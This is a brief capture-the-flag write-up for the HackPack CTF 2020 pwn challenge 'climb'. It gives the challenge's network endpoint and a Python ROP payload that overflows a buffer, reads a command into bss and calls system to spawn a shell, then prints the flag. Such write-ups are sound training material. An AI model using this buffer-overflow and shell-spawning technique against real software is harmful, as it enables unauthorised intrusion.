
## climb (396pt)
### Description

> Can you help me climb the rope? 
>
> `nc cha.hackpack.club 41702`


### Attachment

[climb](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/HackPack-CTF-2020/pwn/climb/climb)

### Analysis

a simple ret2text challenges

### Solution

#### rop

read `cmd` string to `bss` and then call `system(cmd)`

```python
offset = 40
payload = 'A'*offset
payload += p64(prsi_r15) + p64(elf.bss()+0x400)*2 + p64(elf.sym['read']) 
payload += p64(ret) + p64(prdi) + p64(elf.bss()+0x400) + p64(elf.sym['system']) 

sla('How will you respond? ',payload)
sl('/bin/sh')
```

> flag: flag{w0w_A_R34L_LiF3_R0pp3r!}

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/HackPack-CTF-2020/pwn/climb) 


